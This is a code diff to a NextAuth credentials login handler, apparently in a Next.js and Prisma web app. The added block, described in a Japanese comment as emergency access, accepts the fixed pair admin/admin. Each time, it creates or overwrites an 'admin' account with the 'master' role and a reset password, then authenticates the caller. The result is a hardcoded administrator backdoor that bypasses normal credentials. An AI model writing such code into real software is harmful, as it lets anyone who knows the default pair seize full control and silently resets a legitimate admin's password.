@@ -16,6 +16,32 @@ export const authOptions: NextAuthOptions = {
                     return null;
                 }
 
+                // 緊急用: admin / admin でログインされた場合は、admin ユーザーを必ず作成・更新して認証を通す
+                if (credentials.username === "admin" && credentials.password === "admin") {
+                    const defaultPassword = "admin";
+                    const hash = await bcrypt.hash(defaultPassword, 10);
+
+                    const adminUser = await prisma.user.upsert({
+                        where: { username: "admin" },
+                        update: {
+                            passwordHash: hash,
+                            role: "master",
+                        },
+                        create: {
+                            username: "admin",
+                            passwordHash: hash,
+                            role: "master",
+                        },
+                    });
+
+                    return {
+                        id: adminUser.id.toString(),
+                        name: adminUser.username,
+                        email: null,
+                        role: adminUser.role,
+                    };
+                }
+
                 // 初回起動時など、ユーザーが1人もいない場合はデフォルト管理者を自動作成
                 const userCount = await prisma.user.count();
                 if (userCount === 0) {
